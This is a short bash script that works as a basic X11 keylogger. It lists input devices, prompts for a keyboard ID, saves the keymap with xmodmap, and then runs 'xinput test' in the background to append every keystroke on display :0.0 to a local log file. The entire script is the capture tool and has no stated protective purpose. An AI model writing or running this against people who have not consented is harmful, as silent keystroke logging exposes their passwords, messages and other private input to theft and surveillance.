#!/bin/bash
export DISPLAY=:0.0
xinput list
echo -e "KBD ID ?"
read kbd 
xmodmap -pke > ./xkey.log
script -c "xinput test $kbd" | cat >> ./xkey.log &
